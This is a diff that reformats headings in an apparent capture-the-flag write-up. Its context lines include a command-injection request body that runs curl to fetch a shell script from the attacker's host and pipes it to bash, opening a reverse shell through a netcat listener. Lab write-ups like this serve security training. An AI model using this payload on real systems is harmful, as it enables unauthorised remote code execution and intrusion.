@@ -4,9 +4,9 @@
 
 >David-Andrei Popa (contact@popadavid.ro)
 
-# Solution
+## Solution
 
-## User
+### User
 
 Firstly, we scan the given IP using nmap.
 
@@ -72,7 +72,7 @@ Using a classic remote shell payload, we can start up a remote connection to the
 
 We start up our netcat listener on port 4000 and using our python webserver we download the shell on the machine.
 
-```HTTP
+```http
 Request body
 
 date=;curl "http://10.10.14.230:4000/shell.sh"|bash
@@ -80,7 +80,7 @@ date=;curl "http://10.10.14.230:4000/shell.sh"|bash
 
 Upon getting a reverse shell, we can use `pwd` to localize the current working directory. Thus, by navigating to the user's folder, we get the `user.txt` file.
 
-## Root
+### Root
 
 At this point we could upgrade our shell if we want to. I decided to leave it as it is and proceed to the next goal.
 
